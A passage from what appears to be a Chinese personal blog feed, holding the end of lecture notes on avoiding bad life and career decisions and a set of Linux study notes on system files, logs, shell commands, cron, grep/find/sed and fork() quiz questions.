class="line">比如旅游的时候，被人忽悠买了一堆纪念品，或者路过某个商场促销，一时兴奋花了点钱，这种事无伤大雅；但做人生关键决策的时候，一定要理性，这个是非常值得强调的。</span><br><span class="line"></span><br><span class="line">冲动还包括好面子，一时为了让别人看得起，往往会做出非常不理性的决策。成年人请记住，好面子往往做出愚蠢的决策。很多时候，往往因为一些小事，却冲动做出非常灾难性的决策。</span><br><span class="line"></span><br><span class="line">争勇斗狠，走上犯罪道路，那就是追悔莫及了。</span><br><span class="line"></span><br><span class="line">冲动是一瞬间的事情，为冲动后悔是半生漫长的记忆。</span><br><span class="line"></span><br><span class="line">看过有个新闻，曾经有个女生，嫌她男朋友怂，面对别人欺负没有胆气，结果她男朋友冲动去表现了一把，被坏人捅死了，这个女生后悔也来不及了。</span><br></pre></td></tr></table></figure>
<h3 id="侥幸心理"><a href="#侥幸心理" class="headerlink" title="侥幸心理"></a>侥幸心理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明知道有问题，明知道不合法，总觉得，自己可以成功逃脱。</span><br><span class="line">最近那个案例，那个42亿美元的什么币来着，按照非法传销，所有违法收入全部充公。</span><br><span class="line">什么，你说你是受害者，别揣着明白装糊涂，你忽悠下线的时候，明明就是帮凶。</span><br><span class="line"></span><br><span class="line">最近这些年，我写有关文章就被人喷过无数次，“你傻逼，你不懂，那是新经济。”</span><br><span class="line">出事后，这些人说自己是受害人。我特么的才是受害人，我那么人畜无害还会被他们喷，我才不可怜他们。</span><br><span class="line"></span><br><span class="line">记着墨菲定律，凡是担心的事情，就一定会发生。牢记这句话，可以少犯很多错误。</span><br><span class="line"></span><br><span class="line">很多事情的发展，我们不能完全预测，一个基本原则是，向最好的方向努力，但也要做好最坏的打算。如果你有这样的思维方式，就可以知道什么事情是不能碰的，你没办法做最坏的打算的事情，坚决不要碰。</span><br></pre></td></tr></table></figure>
<h3 id="权威盲从"><a href="#权威盲从" class="headerlink" title="权威盲从"></a>权威盲从</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上一讲我讲过自��经历过这样的傻逼案例，有兴趣的可以回顾一下上一讲内容。</span><br><span class="line"></span><br><span class="line">那么多说一点，这还要结合一个概念来说，就是选择性阅读。</span><br><span class="line">你认为什么会涨，你就会主动挑选这个东西会涨的文章，某个专家说这个会涨，会加深你的观点和偏见。其实还有专家说这个会跌，你是看不见的，或者看见了也不以为然的。</span><br><span class="line">权威盲从，其实是自己给自己的偏见找了一个信用背书的借口，人们总是试图找各种借口来证明自己，安慰自己。</span><br><span class="line"></span><br><span class="line">所以这就是为什么我希望你的信息不要来自于投喂，投喂是基于你的选择，会加剧你的偏见。一定要主动搜索！相对来说，可能会好一丢丢。</span><br><span class="line">还有，我们对权威的认定也是有误区的，特别是免疫力不高的年轻人，或者知识层次不高的老人，很容易被一些伪权威，伪专家忽悠。</span><br><span class="line"></span><br><span class="line">哪怕是真权威，也会忽悠你的，还记得让你ALL In 区块链的投资人么，那可是货真价实的权威。人家没ALL In，人家删帖了，你再追究人家也不承认了。</span><br><span class="line"></span><br><span class="line">之前不是有文章说么，诺贝尔奖获得者都是可以收买站台的，而且我们知道奥巴马也是可以花钱站台的，还有什么权威是绝对可信的。</span><br><span class="line"></span><br><span class="line">不要盲从权威，要有自己的判断力。更不要盲从伪权威，一定要建立自己的底层逻辑和判断力。再大的权威也有被利益锁定的时候。</span><br></pre></td></tr></table></figure>
<h3 id="不留余地"><a href="#不留余地" class="headerlink" title="不留余地"></a>不留余地</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">人生中难免出现一些错误决策，或者说负向决策，但只要快速止损，通常不致命。而且只要肯积极反思复盘，也许可以有积极的一面。</span><br><span class="line"></span><br><span class="line">旧文反复强调，不要ALL In。如果你为一个负向决策ALL In了，那么想翻身就难了。</span><br><span class="line">史玉柱经历过一次，当然他了不起，成功翻身了，但你问问他还想再来一次不？</span><br><span class="line"></span><br><span class="line">人生最大的错误，不是做出错误的决策，而是为错误的决策ALL In。</span><br><span class="line"></span><br><span class="line">当然，有些年轻人，对未来收入预期较为乐观，毕竟年轻是本钱，ALL In一些创业项目，也不见得就不行，但记住保障自己的身体和后续的职场口碑，留住这些，总还有机会。 但也尽量别负债，或者别承担超出自己收入能力的债务。</span><br><span class="line"></span><br><span class="line">可以参照一些牛人的观点和意见，但要有自己的判断和逻辑，不要盲从，不是一句都不听。</span><br><span class="line"></span><br><span class="line">还有就是，可以看看牛人们做什么，如果能了解到，而不是听他们说什么，心口不一的太多了，特别是一些老江湖。</span><br><span class="line"></span><br><span class="line">很多时候，大佬们做什么是演出来的，这个也挺难判断的。</span><br><span class="line"></span><br><span class="line">幸存者偏差会告诉你，他们ALL In ,并且成功了。</span><br><span class="line">记住，你未必每次都幸运，甚至，你可能第一次就不幸运。</span><br><span class="line"></span><br><span class="line">如果是中年人，想创业，想做一点有梦想的事情，至少给家人留一点保障。</span><br></pre></td></tr></table></figure>
<h3 id="自我认知障碍"><a href="#自我认知障碍" class="headerlink" title="自我认知障碍"></a>自我认知障碍</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">高估自己，或者低估自己，都是容易造成错误决策的原因。</span><br><span class="line">低估自己通常不致命，但面对好机会可能会错过。</span><br><span class="line">而高估自己是有可能犯下大错的。太多错误决策来自于盲目自信，所谓淹死的都是会水的。我看过一个记载，一个专业的顶尖自由潜的救生员，是怎么出事送命的，过于自信，准备不足，在接应队友的时候连续犯错，结果葬送了自己</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很多人会以为自己很专业，会以为自己可以控制和处理复杂的局面，但其实他们并没有他们想象的那么有能力。</span><br><span class="line"></span><br><span class="line">说个可能让大家不太舒服的例子，科比不应该在天气恶劣的时候，驾驶飞机出行。</span><br><span class="line"></span><br><span class="line">前一讲有自我认知评估的测试，建议读者回顾一下。自我认知是个长期的过程，需要不断地反思自己，剖析自己。当然，可能也需要至亲的好友的反馈，那种愿意讲真话的朋友。</span><br><span class="line"></span><br><span class="line">网上有很多自我认知象限的测试，有兴趣的可以自己试试，其实我觉得有些也挺扯，有些可以作为参考，不用尽信，看看也没坏处。</span><br></pre></td></tr></table></figure>
<h3 id="环境和市场认知障碍"><a href="#环境和市场认知障碍" class="headerlink" title="环境和市场认知障碍"></a>环境和市场认知障碍</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我接触过很多创业者，也见识过很多非常不靠谱的创业方案。</span><br><span class="line"></span><br><span class="line">说一些典型的认知问题。</span><br><span class="line"></span><br><span class="line">对获客成本没概念，总以为用户可以轻松获取。</span><br><span class="line"></span><br><span class="line">对流量运营的方法和技巧没概念。</span><br><span class="line"></span><br><span class="line">对策略风控没概念，比如不知道所有ugc内容的平台，审核成本和安全边界都是非常非常超出常人认知的。</span><br><span class="line"></span><br><span class="line">最怕的还有，对人性没概念，产品充满理想主义，缺乏对可能的破坏行为的预防措施。</span><br><span class="line"></span><br><span class="line">这种认知问题带来的决策，当然都是问题重重，失败率极高。</span><br><span class="line"></span><br><span class="line">那存在认知障碍的情况下，怎样能够不失败呢，两个要点，第一是学习能力足够快，能够在上线运营的过程中，最短时间发现问题并快速解决。第二是资源足够多，有足够的资源支持交学费，支持不断迭代前进。通常这二者缺一不可，稍微差一点都是必死无疑。</span><br><span class="line"></span><br><span class="line">更好的理解这个世界，理解商业，理解社会环境，理解政策法规，理解市场运营的机制，提升对世界的认知，有助于你做出相对来说正确的决策。</span><br><span class="line"></span><br><span class="line">特别要说的是，世界不是非黑即白，不是非此即彼，很多商业的逻辑不是简单的好坏对错，不能用二元思维去看世界。一个成功的项目，可能有诸多因素的共同成就，包括实力，包括资本，也包括运气。很多人喜欢简单归因，并自以为掌握了世界的真谛，这种认知是要不得的。</span><br><span class="line"></span><br><span class="line">但是反过来说呢，做决策的时候也要懂得抓大放小，要知道有所取舍，不能说我理解世界的复杂性了，就必须要用非常复杂的策略来应对。理解复杂的世界，然后做出简单的应对策略，这才是非常非常优秀的，顶尖人才的特质。</span><br><span class="line"></span><br><span class="line">那么总结一下，如何避免坏的决策，前面十条，对号入座。</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">那么我要分享的内容呢，差不多也就这些了，我最后总结一下</span><br><span class="line"></span><br><span class="line">第一呢，如何尽量做出正确的决策，也就是我们需要基于什么做出决策。这是第一讲的内容，真的希望多回顾一下。</span><br><span class="line"></span><br><span class="line">第二呢，是做出决策后，依然需要不断地复盘，以及针对性的调整。好的决策也可能是多次决策迭代出来的。</span><br><span class="line"></span><br><span class="line">第三，做出错误的决策，或者说，不够优秀的决策，也不是说末日，认清现实后，继续追求最好的行动，可以减少错误决策的损失，甚至有可能让错误的决策发挥正确的效用。人们总是沉浸于后悔和懊恼，而缺乏改变现实的勇气和决心。</span><br><span class="line"></span><br><span class="line">第四，我把常见的错误决策的原因列出来，也是希望大家能够和自己对照一下，尽量避免一些这样的情形。</span><br></pre></td></tr></table></figure>
<h2 id="嘉宾分享"><a href="#嘉宾分享" class="headerlink" title="嘉宾分享"></a>嘉宾分享</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stormzhang:今天就跟大家聊聊我这三次经历.</span><br><span class="line"></span><br><span class="line">第一次是决定测试转行开发，然后选择了移动开发。</span><br><span class="line"></span><br><span class="line">第二次是，我在做技术那会，开始了写博客之旅，并且坚持写博客，坚持在社交平台输出观点，这为后来我积累影响力奠定了基础。</span><br><span class="line"></span><br><span class="line">第三次是我的公众号在 17 年的时候改名了，从原来的 AndroidDeveloper 改成了现在的 stormzhang，很多人可能以为我的公众号一直是 stormzhang，其实不是，这个过程老读者是知道的。</span><br><span class="line"></span><br><span class="line">即便现在，我在创业过程中有一些困惑的时候，也多会去问冯大和曹大的建议，他们的建议我不一定会无脑相信，但我会非常重视，作为我最终做出正确决策的一个参考。</span><br><span class="line"></span><br><span class="line">曹大的课程里提到一点，市场是变化的，任何决策一定要适应市场，我这次决策刚好印证了这条，市场不仅在变化，其实关于我个人的认知，发展方向，能力等等也都在变化，那么这时候再死守原来的决策是一种看似稳妥，实则不求上进的做法。</span><br><span class="line"></span><br><span class="line">1、一定要跟随时代发展的趋势，多尝试新事物，多拥抱新兴行业，务必记得我常说的一句话：早就是优势。</span><br><span class="line"></span><br><span class="line">2、多追随牛人，多重视比你牛逼的人的建议，他们的一言一行，他们的一举一动都值得你格外关注。也许你当下的认知还不理解他们那么做的目的，但是不妨碍你立即追随，不然等你领悟的时候，已经晚了。</span><br><span class="line"></span><br><span class="line">3、生活也好，职场也好，创业也罢，不要追求一招鲜吃遍天，要知道这个世界是一直在变化，世界在变化，也就意味着你的决策要跟上时代的变化，不然你只会被时代抛弃，就如我们中的大部分，都认为我们的父辈们思想落后，他们的决策大部分是落伍的一样。</span><br><span class="line"></span><br><span class="line">4、我再额外补充一条，决策的目的是要对自己有利，所以我们做任何决策之前都要想想这个事情。</span><br><span class="line"></span><br><span class="line">因为我做自媒体，我常看到的一种现象是，很多人总是对别人过于苛刻，觉得别人不行，喷这个喷那个，即便是你在网上的一句评论其实也是一种决策，互联网时代，你可以随意冒犯甚至中伤他人，但是想想对你有什么好处？然而多支持他人，多赞美他人反而是对自己有利的，未来的某一天，说不定你会因为对别人的支持与认可而得到意料不到的回馈。</span><br><span class="line"></span><br><span class="line">永远记得，宁结善缘，不种恶果。</span><br><span class="line"></span><br><span class="line">问题：想请教一下，做技术开发应用一定要紧跟最前沿吗，有些新技术开发也有些忽悠人的，如果身边没有行业人士资源，如何判断这样的技术最后能否落地，或者成为新风口呢？非常感谢！</span><br><span class="line">回答：新技术你要看谁在用，哪些公司在支持，哪些团队在使用，学新技术也不一定非要抢在最前面。至少看到有强大的行业支撑</span><br><span class="line">问题：权威的言论在网上比较容易查到，但怎么知道权威是否有做出对应的行为呢?</span><br><span class="line">回答：不知道的话，建议保持一定的怀疑。包括对我的言论也一样。</span><br><span class="line"></span><br><span class="line">蓝驰创投合伙人朱天宇: 投中了非常多的独角兽企业，是我当年的老同事，在投资领域目前如日中天，包括理想汽车，包括趣分期，美丽说等等等等。</span><br><span class="line"></span><br><span class="line">![20210228224147](http://tuchuang.xchcloud.cn/20210228224147.png)</span><br></pre></td></tr></table></figure>
<p><img data-src="http://tuchuang.xchcloud.cn/曹大年终福利课-课代表-思维导图.png" alt="曹大年终福利课-课代表-思维导图"><br><a href="https://mp.weixin.qq.com/s/n_pXZv2mIPEnkM2k2g3z9A" target="_blank" rel="noopener">人生关键角色转变：走向职场人</a><br><a href="https://mp.weixin.qq.com/s/VMWqov7utkyui9lW_MdXWw" target="_blank" rel="noopener">关键决策和复盘</a><br><a href="https://mp.weixin.qq.com/s/7SBOxryKBtM6PGYilJtEtA" target="_blank" rel="noopener">人若焦虑，奋力赚钱</a></p>
]]></content>
  </entry>
  <entry>
    <title>Linux复盘笔记</title>
    <url>/Linux%E5%A4%8D%E7%9B%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><p><strong>/etc/mtab</strong>文件的作用：记载的是现在系统已经装载的文件系统，包括操作系统建立的虚拟文件等；而/etc/fstab是系统准备装载的</p>
<p><strong>etc/fstab</strong>文件的作用 ：记录了计算机上硬盘分区的相关信息，启动 Linux 的时候，检查分区的 fsck 命令，和挂载分区的 mount 命令，都需要 fstab 中的信息，来正确的检查和挂载硬盘。</p>
<p><strong>/etc/ld.so.conf</strong> 此文件记录了编译时使用的动态库的路径，也就是加载so库的路径。</p>
<p>xdm （X Display Manager）是一种图形化的登录界面。配置文件都放在<strong>/etc/X11/xdm</strong>目录下<br><a id="more"></a><br>Xsession文件决定了用户会话的风格，包含用户会话使用的命令<br>Xsetup_0文件中的程序会和图形登录界面一起运行<br>GiveConsole文件决定了在Xwindows移交给用户之前要执行的一些程序。 </p>
<p><strong>/etc/rc.d/rc.local</strong>：一个启动加载配置文件，这个配置文件会在用户登陆之前读取，这个文件中写入了什么命令，在每次系统启动时都会执行一次。也就是说，如果有任何需要在系统启动时运行的工作，则只需写入 /etc/rc.d/rc.local 配置文件即可。把一个程序加入开机启动，一般也可以通过修改rc.local来完成。</p>
<p>/&gt; 和&gt;&gt;：他们俩其实唯一的区别就是&gt;是重定向到一个文件，&gt;&gt;是追加内容到文件。两个命令都是如果文件不存在则创建文件。</p>
<p>1&gt;&gt;、2&gt;&gt;、1&gt;、2&gt;：1表示运行程序时程序正确运行输出结果的重定向、1表示运行程序时时程序错误运行信息（如异常信息）的重定向，然后&gt;&gt;与&gt;的区别和上面一样。</p>
<p>注：echo “mkdir /misc/<code>date +%Y%m%d</code>“ &gt;&gt; /etc/rc.d/rc.local不一定在实际操作中有用，应为rc.local会被Linux的不同版本修改，如ubuntu中在case语句块里脚本就退出了，追加到文件尾部的话不会被执行。</p>
<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。</span><br><span class="line">/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。</span><br><span class="line">/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</span><br><span class="line">/var/log/boot.log — 包含系统启动时的日志。</span><br><span class="line">/var/log/daemon.log — 包含各种系统后台守护进程日志信息。</span><br><span class="line">/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。</span><br><span class="line">/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。</span><br><span class="line">/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</span><br><span class="line">/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。</span><br><span class="line">/var/log/user.log — 记录所有等级用户信息的日志。</span><br><span class="line">/var/log/Xorg.x.log — 来自X的日志信息。</span><br><span class="line">/var/log/alternatives.log – 更新替代信息都记录在这个文件中。</span><br><span class="line">/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。</span><br><span class="line">/var/log/cups — 涉及所有打印信息的日志。</span><br><span class="line">/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。</span><br><span class="line">/var/log/yum.log — 包含使用yum安装的软件包信息。</span><br><span class="line">/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。</span><br><span class="line">/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。</span><br><span class="line">/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。</span><br><span class="line">/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</span><br><span class="line">除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：</span><br><span class="line"></span><br><span class="line">/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。</span><br><span class="line">/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。</span><br><span class="line">/var/log/mail/ –  这个子目录包含邮件服务器的额外日志。</span><br><span class="line">/var/log/prelink/ — 包含.so文件被prelink修改的信息。</span><br><span class="line">/var/log/audit/ — 包含被 Linux audit daemon储存的信息。</span><br><span class="line">/var/log/samba/ – 包含由samba存储的信息。</span><br><span class="line">/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。</span><br><span class="line">/var/log/sssd/ – 用于守护进程安全服务。</span><br></pre></td></tr></table></figure>
<p>批量删除当前目录下后缀名为.c的文件。如a.c、b.c。<br>rm <em>.c<br>find . -name “</em>.c” -maxdepth 1 | xargs rm<br>-maxdepth  参数要写在其他参数的前面，同时在路径的后面<br>用 xargs 是由于很多命令不支持 | 管道来传递参数，而日常工作中有有这个必要，所以就有了 xargs 命令</p>
<p>线性访问内存非法时，当前线程会进入信号处理函数</p>
<p>在UNIX中<br>$$ 表示当前命令的进程标识数<br>$<em>表示所有位置参量，<br>$@与$</em>类似，不同处在于$@：”$1” “$2” … “$n”； $*: “$1 $2 … $n”。<br>$# 参数个数</p>
<p><strong>sort</strong> 是按ASCII码排序<br>-n   依照数值的大小排序。<br>-r   以相反的顺序来排序。<br>uniq -c 是去重并显示个数<br>head -n 3 为取前3行</p>
<p>有一个文件ip.txt，每行一条ip记录，共若干行，下面哪个命令可以实现“<strong>统计</strong>出现次数最多的前3个ip及其次数”？</p>
<p>sort ip.txt | uniq -c | sort -rn | head -n 3</p>
<p>首先排序sort，相同的ip会排在一起，然后uniq -c 会去掉重复的ip，只有保留一条，同时记录重复数在行首，如： 3 ip1   \n    1 ip2   \n 2 ip3，再按照数字反向排序即可sort -nr，-n是按照数字，-r是降序，最好 head -n 3取出前三个即可。</p>
<p><strong>创建用户</strong>时不指定用户主目录的参数 useradd -M</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>全称</th>
<th>释义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-b</td>
<td>base-dir BASE_DIR</td>
<td>新账户的主目录的基目录</td>
</tr>
<tr>
<td>-c</td>
<td>comment COMMENT</td>
<td>新账户的 GECOS 字段</td>
</tr>
<tr>
<td>-d</td>
<td>home-dir HOME_DIR</td>
<td>新账户的主目录</td>
</tr>
<tr>
<td>-D</td>
<td>defaults</td>
<td>显示或更改默认的 useradd 配置</td>
</tr>
<tr>
<td>-e</td>
<td>expiredate EXPIRE_DATE</td>
<td>新账户的过期日期</td>
</tr>
<tr>
<td>-f</td>
<td>inactive INACTIVE</td>
<td>新账户的密码不活动期</td>
</tr>
<tr>
<td>-g</td>
<td>gid GROUP</td>
<td>新账户主组的名称或 ID</td>
</tr>
<tr>
<td>-G</td>
<td>groups GROUPS</td>
<td>新账户的附加组列表</td>
</tr>
<tr>
<td>-h</td>
<td>help</td>
<td>显示此帮助信息并推出</td>
</tr>
<tr>
<td>-k</td>
<td>skel SKEL_DIR</td>
<td>使用此目录作为骨架目录</td>
</tr>
<tr>
<td>-K</td>
<td>key KEY=VALUE</td>
<td>不使用 /etc/login.defs 中的默认值</td>
</tr>
<tr>
<td>-l</td>
<td>no-log-init</td>
<td>不要将此用户添加到最近登录和登录失败数据库</td>
</tr>
<tr>
<td>-m</td>
<td>create-home</td>
<td>创建用户的主目录</td>
</tr>
<tr>
<td>-M</td>
<td>no-create-home</td>
<td>不创建用户的主目录</td>
</tr>
<tr>
<td>-N</td>
<td>no-user-group</td>
<td>不创建同名的组</td>
</tr>
<tr>
<td>-o</td>
<td>non-unique</td>
<td>允许使用重复的 UID 创建用户</td>
</tr>
<tr>
<td>-p</td>
<td>password PASSWORD</td>
<td>加密后的新账户密码</td>
</tr>
<tr>
<td>-r</td>
<td>system</td>
<td>创建一个系统账户</td>
</tr>
<tr>
<td>-s</td>
<td>shell SHELL</td>
<td>新账户的登录 shell</td>
</tr>
<tr>
<td>-u</td>
<td>uid UID</td>
<td>新账户的用户 ID</td>
</tr>
<tr>
<td>-U</td>
<td>user-group</td>
<td>创建与用户同名的组</td>
</tr>
<tr>
<td>-Z</td>
<td>selinux-user SEUSER</td>
<td>为 SELinux 用户映射使用指定 SEUSER</td>
</tr>
</tbody>
</table>
<h3 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h3><p><strong>计划</strong>让系统自动在每个月的第一天早上4点钟执行一个维护工作:<br>00 4 1 1-12 * /maintenance.pl<br><img data-src="https://uploadfiles.nowcoder.com/images/20170814/9067279_1502703501686_5BBE4306EE92AAA51FEF3179E76007A5" alt><br><img data-src="https://uploadfiles.nowcoder.com/images/20170814/9067279_1502703477808_F1444EA3F0939C35C2674B656C2CF7CB" alt></p>
<p>每5分钟运行一次crond任务exam：<br><em>/5 </em> <em> </em> * exam</p>
<p>每5分钟运行一次exam<br>基本格式 :<br><em>　　</em>　　<em>　　</em>　　<em>　　command<br>分　时　日　月　周　命令<br>第1列表示分钟1～59 每分钟用</em>或者 */1表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令<br><img data-src="https://uploadfiles.nowcoder.com/images/20160927/474717_1474935914553_2E857D0459E6718C8203149173376D1A" alt></p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><strong>查找列出</strong>/usr/local这个目录下所有包含字符mrtg的文件<br>grep -Rn “mrtg” /usr/local</p>
<p>查找当前目录一个月(30天)以前大于100M的日志文件(.log)并删除<br>find  . -name “*.log” –mtime +30 –type f –size +100M |xargs rm –rf {} ;</p>
<p>统计出现次数最多的前3个ip及其次数<br>sort ip.txt│uniq -c│sort -rn│head -n 3</p>
<p>统计一个文件中”牛客”出现的行数<br>grep “牛客” 文件名 | wc -l</p>
<p>查看file1文件的第300-500行的内容<br>cat file1| head -n 500 | tail -n +300<br>sed -n ‘300,500p’ file1</p>
<p>找到文件try_grep含有以a字母为行开头的内容<br>grep -E ^a try_grep</p>
<p>在当前目录及其子目录所有的.cpp文件中查找字符串”example”<br>grep -i -r example ./*.cpp</p>
<p>cat,less,more都可以查看，只是查看的方式不一样，<br>less可以让光标上下移动，<br>more只能用enter键往下翻，<br>cat的话直接跳到最后一页了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看file1文件的第300-500行的内容</span><br><span class="line"></span><br><span class="line">方法一：</span><br><span class="line">tail -n +K是输出从第K行开始的内容。</span><br><span class="line">先输出从第300行开始的内容，然后输出前200行。</span><br><span class="line">cat file1 | tail -n +300 | head -n 200</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">tail -n K是输出最后K行的内容。</span><br><span class="line">先输出前500行，然后输出其中从第300行开始的内容。</span><br><span class="line">cat file1| head -n 500 | tail -n + 300</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">直接通过sed -n命令获取指定范围的内容，其中p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行。</span><br><span class="line">sed -n ‘300,500p’ file1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式</span><br><span class="line">grep [options]</span><br><span class="line"></span><br><span class="line">主要参数</span><br><span class="line">[options]主要参数：</span><br><span class="line">－c：只输出匹配行的计数。</span><br><span class="line">－I：不区分大 小写(只适用于单字符)。</span><br><span class="line">－h：查询多文件时不显示文件名。</span><br><span class="line">－l：查询多文件时只输出包含匹配字符的文件名。</span><br><span class="line">－n：显示匹配行及 行号。</span><br><span class="line">－s：不显示不存在或无匹配文本的错误信息。</span><br><span class="line">－v：显示不包含匹配文本的所有行。</span><br><span class="line">pattern正则表达式主要参数：</span><br><span class="line">\： 忽略正则表达式中特殊字符的原有含义。</span><br><span class="line">^：匹配正则表达式的开始行。</span><br><span class="line">$: 匹配正则表达式的结束行。</span><br><span class="line">\&lt;：从匹配正则表达 式的行开始。</span><br><span class="line">\&gt;：到匹配正则表达式的行结束。</span><br><span class="line">[ ]：单个字符，如[A]即A符合要求 。</span><br><span class="line">[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</span><br><span class="line">。：所有的单个字符。</span><br><span class="line">* ：有字符，长度可以为0。</span><br></pre></td></tr></table></figure>
<p>POSIX线程同步方式包括：互斥锁、条件变量（cond）、读写锁和POSIX信号量.<br><a href="https://www.cnblogs.com/iamwho/p/10450093.html" target="_blank" rel="noopener">资料链接</a></p>
<p><strong>/etc/fstab</strong>是用来存放文件系统的静态信息的文件。位于/etc/目录下，可以用命令less /etc/fstab 来查看，如果要修改的话，则用命令 vi /etc/fstab 来修改。<br>当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。下面我来介绍如何在此文件下填写信息。<br><a href="http://blog.csdn.net/richerg85/article/details/17917129" target="_blank" rel="noopener">资料链接</a></p>
<p>下列有关<strong>Nginx</strong>配置文件nginx.conf的叙述正确的是（）<br>A. 进程数设置为CPU总核心数最佳。  (正确)<br>B. 配置虚拟主机，多个域名时，用 空格 分隔。 (错误)<br>C. 设定http服务器中 sendfile on;   #开启高效文件传输模式<br>    普通应用设置为on；<br>    用于进行下载等应用磁盘IO重负载应用，设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。(错误)<br>D. 工作模式与连接数上限 ：（最大连接数 = 连接数 * 进程数）(正确)<br><a href="https://blog.csdn.net/weixin_41850404/article/details/84563798" target="_blank" rel="noopener">资料链接</a></p>
<p>Linux系统中，已经将DHCP服务器架设好，客户端的网络接口eth0，可以通过（ ）命令获得服务器分配的IP地址。<br>dhclient         使用动态主机配置协议动态的配置网络接口的网络参数。<br>ifdown eth0；ifup eth0<br>service network stop；service network start</p>
<p>在linux<strong>网络编程</strong>中,以下关于socket描述符正确的是:</p>
<p>socket存在两种模式:阻塞和非阻塞<br>系统调用read从socket中读取数据时,当read返回0的时候,表示socket中数据读取完毕<br>如果socket设置成非阻塞模式,当socket的输入缓冲区没有可读数据时,read操作会返回错误</p>
<p><a href="https://blog.csdn.net/hguisu/article/details/7453390" target="_blank" rel="noopener">资料链接</a></p>
<p>使用vi编辑文件时，要将某文本文件第1行到5行的内容<strong>复制</strong>到文件中的指定位置，以下（  ）操作能实现该功能。</p>
<p>将光标移到第1行，在vi命令模式下输入5yy,然后将光标移到制定位置，按p键<br>使用末行命令1，5y，然后将光标移到制定位置，按p键</p>
<p>nyy：复制以下n行<br>n,my：指定n到m行复制<br>p：在光标下一行粘贴<br>P（大写）：在光标上一行粘贴（插入）</p>
<p>我希望看最近执行的3个命令(不包括history)，需要用哪个命令:<br>history 4<br>history没有-n选项。</p>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>不算 main 这个进程自身，到底创建了多少个<strong>进程</strong>啊？<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">   fork();</span><br><span class="line">   fork() &amp;&amp; fork() || fork();</span><br><span class="line">   fork();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>考查两个点<br>1、A&amp;&amp;B||C<br>A为假，跳过B，判断C<br>A为真，判断B，若B为真，跳过C<br>                          若B为假，判断C<br>2、fork（）函数父进程返回子进程ID；子进程返回0</p>
<p>第一条语句新增1个<br>第二条语句新增4<em>2个<br><img data-src="http://uploadfiles.nowcoder.com/images/20150721/542107_1437489378052_QQ%E5%9B%BE%E7%89%8720150721223854.png" alt><br>第三条语句，此时已有进程1+1+4</em>2个，所以新增10个</p>
<p>Fork后子进程保留了父进程的什么？<br>环境变量<br>当前工作目录</p>
<p>使用fork函数得到的子进程从父进程的继承了整个进程的地址空间，包括：进程上下文、进程堆栈、内存信息、打开的文件描述符、信号控制设置、进程优先级、进程组号、当前工作目录、根目录、资源限制、控制终端等。<br>子进程与父进程的区别在于：<br>1、父进程设置的锁，子进程不继承（因为如果是排它锁，被继承的话，矛盾了）<br>2、各自的进程ID和父进程ID不同<br>3、子进程的未决告警被清除；<br>4、子进程的未决信号集设置为空集。<br><a href="https://blog.csdn.net/xiaojun111111/article/details/51764389" target="_blank" rel="noopener">参考资料</a></p>
